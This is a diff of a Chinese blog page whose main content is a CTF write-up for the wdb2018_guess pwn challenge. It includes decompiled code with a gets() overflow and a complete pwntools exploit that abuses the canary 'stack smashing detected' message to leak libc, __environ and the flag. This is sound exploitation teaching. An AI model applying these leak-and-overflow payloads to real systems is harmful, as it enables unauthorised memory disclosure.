@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh-CH">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -18,13 +18,13 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="修改argv[0],使canary报错时泄露信息题目链接  参考文章  知识点： 1.canary报错的利用，熟悉报错的参数是什么 2.__environ环境变量 1.ida速览__int64 __fastcall main(__int64 a1, char **a2, char **a3)&amp;#123;  __WAIT_STATUS stat_loc; &#x2F;&#x2F; [rsp+14h] [rbp-8Ch]">
+        <meta name="description" content="修改argv[0],使canary报错时泄露信息题目链接  参考文章  知识点： 1.canary报错的利用，熟悉报错的参数是什么 2.__environ环境变量 1.ida速览12345678910111213141516171819202122232425262728293031323334353637383940414243__int64 __fastcall main(__int64 a1">
 <meta property="og:type" content="article">
 <meta property="og:title" content="wdb2018_guess--canary报错利用">
 <meta property="og:url" content="http://downbeat.top/2024/09/16/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/index.html">
-<meta property="og:site_name" content="Dream Of All Stack">
-<meta property="og:description" content="修改argv[0],使canary报错时泄露信息题目链接  参考文章  知识点： 1.canary报错的利用，熟悉报错的参数是什么 2.__environ环境变量 1.ida速览__int64 __fastcall main(__int64 a1, char **a2, char **a3)&amp;#123;  __WAIT_STATUS stat_loc; &#x2F;&#x2F; [rsp+14h] [rbp-8Ch]">
-<meta property="og:locale" content="zh_CN">
+<meta property="og:site_name" content="D0wnBe@t">
+<meta property="og:description" content="修改argv[0],使canary报错时泄露信息题目链接  参考文章  知识点： 1.canary报错的利用，熟悉报错的参数是什么 2.__environ环境变量 1.ida速览12345678910111213141516171819202122232425262728293031323334353637383940414243__int64 __fastcall main(__int64 a1">
+<meta property="og:locale" content="zh_CH">
 <meta property="og:image" content="http://downbeat.top/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141131322.bmp">
 <meta property="og:image" content="http://downbeat.top/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916141833635.bmp">
 <meta property="og:image" content="http://downbeat.top/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916143126078.bmp">
@@ -84,9 +84,9 @@
     
 
     <script id="hexo-configurations">
-    window.config = {"hostname":"downbeat.top","root":"/","language":"zh-CN","path":"search.xml"};
+    window.config = {"hostname":"downbeat.top","root":"/","language":"zh-CH","path":"search.xml"};
     window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
-    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
     
@@ -157,7 +157,7 @@
                                    href="/"
                                         >
                                     <i class="fa-regular fa-house fa-fw"></i>
-                                    首页
+                                    HOME
                                     
                                 </a>
 
@@ -191,7 +191,7 @@
                            href="/"
                         >
                             <span>
-                                首页
+                                HOME
                             </span>
                             
                                 <i class="fa-regular fa-house fa-sm fa-fw"></i>
@@ -210,15 +210,15 @@
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
         <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
-        <div class="label text-third-text-color text-sm">标签</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
         <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
-        <div class="label text-third-text-color text-sm">分类</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
         <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">32</div>
-        <div class="label text-third-text-color text-sm">文章</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
     </div>
@@ -266,14 +266,14 @@
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-09-16 13:51:13</span>
         <span class="mobile">2024-09-16 13:51:13</span>
-        <span class="hover-info">创建</span>
+        <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
             <span class="desktop">2024-09-16 15:17:22</span>
             <span class="mobile">2024-09-16 15:17:22</span>
-            <span class="hover-info">更新</span>
+            <span class="hover-info">Updated</span>
         </span>
     
 
@@ -294,12 +294,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1k 字</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 分钟</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 Mins</span>
         </span>
     
     
@@ -323,7 +323,7 @@
 <p><font color="red">知识点：</font></p>
 <p>1.<strong>canary报错的利用，熟悉报错的参数是什么</strong></p>
 <p>2.<strong>__environ环境变量</strong></p>
-<h2 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">56</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3LL</span>;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  sub_4009A6(a1, a2, a3);</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">&quot;./flag.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;./flag.txt&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you have no sense... bye :-) &quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400A11() ) <span class="comment">// 此处创建子进程</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your guessing flag&quot;</span>);</span><br><span class="line">  gets(s2); <span class="comment">// 明显的栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You must have great six sense!!!! :-o &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h2 id="1-ida速览"><a href="#1-ida速览" class="headerlink" title="1.ida速览"></a>1.ida速览</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; <span class="comment">// [rsp+14h] [rbp-8Ch] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">56</span>]; <span class="comment">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = <span class="number">3LL</span>;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  sub_4009A6(a1, a2, a3);</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(<span class="string">&quot;./flag.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HIDWORD(stat_loc.__iptr) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;./flag.txt&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This is GUESS FLAG CHALLENGE!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you have no sense... bye :-) &quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400A11() ) <span class="comment">// 此处创建子进程</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please type your guessing flag&quot;</span>);</span><br><span class="line">  gets(s2); <span class="comment">// 明显的栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You must have great six sense!!!! :-o &quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should take more effort to get six sence, and one more challenge!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 
 
@@ -342,7 +342,7 @@
 <ul>
 <li>这里可以很清楚的看到输入的地址和argv[0]相差0x128,我们通过栈溢出覆盖此处的地址为got表地址即可泄露libc</li>
 </ul>
-<h3 id="1-泄露Libc："><a href="#1-泄露Libc：" class="headerlink" title="(1) 泄露Libc："></a>(1) 泄露Libc：</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure></div>
+<h3 id="1-泄露Libc："><a href="#1-泄露Libc：" class="headerlink" title="(1) 泄露Libc："></a>(1) 泄露Libc：</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure></div>
 
 <ul>
 <li>看看实际效果</li>
@@ -357,11 +357,11 @@
 <ul>
 <li>发现flag的地址与__environ的地址差距0x168，因此将environ的地址泄露出来,再减去0x168就是flag的地址，然后通过同样的溢出，就可以泄露flag了.(该flag是我本地建立的，为了调试方便)</li>
 </ul>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="3-泄露flag"><a href="#3-泄露flag" class="headerlink" title="(3),泄露flag"></a>(3),泄露flag</h3><p>直接看最后的EXP吧</p>
 <p><img lazyload src="/images/loading.svg" data-src="/wdb2018-guess-canary%E6%8A%A5%E9%94%99%E5%88%A9%E7%94%A8/capture_20240916145230691.bmp"></p>
-<h2 id="3-最终EXP"><a href="#3-最终EXP" class="headerlink" title="3.最终EXP"></a>3.最终EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28532)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三次创建fork，相当于可以利用三次程序</span></span><br><span class="line"><span class="comment"># 第一次泄漏libc，第二次泄漏栈地址，第三次泄漏flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>) <span class="comment"># 环境变量的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 -- 打印出flag</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(buf)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<h2 id="3-最终EXP"><a href="#3-最终EXP" class="headerlink" title="3.最终EXP"></a>3.最终EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,28532)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 三次创建fork，相当于可以利用三次程序</span></span><br><span class="line"><span class="comment"># 第一次泄漏libc，第二次泄漏栈地址，第三次泄漏flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 -- 泄漏栈地址</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_address : &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">environ = base + libc.dump(<span class="string">&#x27;__environ&#x27;</span>) <span class="comment"># 环境变量的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step2 -- 泄漏flag地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(environ)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;stack smashing detected ***:&#x27;</span>)</span><br><span class="line">buf = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x168</span></span><br><span class="line">success(<span class="string">&#x27;buf(flag)_address : &#x27;</span>+<span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3 -- 打印出flag</span></span><br><span class="line">payload = cyclic(<span class="number">0x128</span>) + p64(buf)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please type your guessing flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
 
 
         </div>
@@ -370,27 +370,27 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> wdb2018_guess--canary报错利用</li>
-        <li><strong>作者:</strong> The Redefine Team</li>
-        <li><strong>创建于
+        <li><strong>Title:</strong> wdb2018_guess--canary报错利用</li>
+        <li><strong>Author:</strong> The Redefine Team</li>
+        <li><strong>Created at
                 :</strong> 2024-09-16 13:51:13</li>
         
             <li>
-                <strong>更新于
+                <strong>Updated at
                     :</strong> 2024-09-16 15:17:22
             </li>
         
         <li>
-            <strong>链接:</strong> https://redefine.ohevan.com/2024/09/16/wdb2018-guess-canary报错利用/
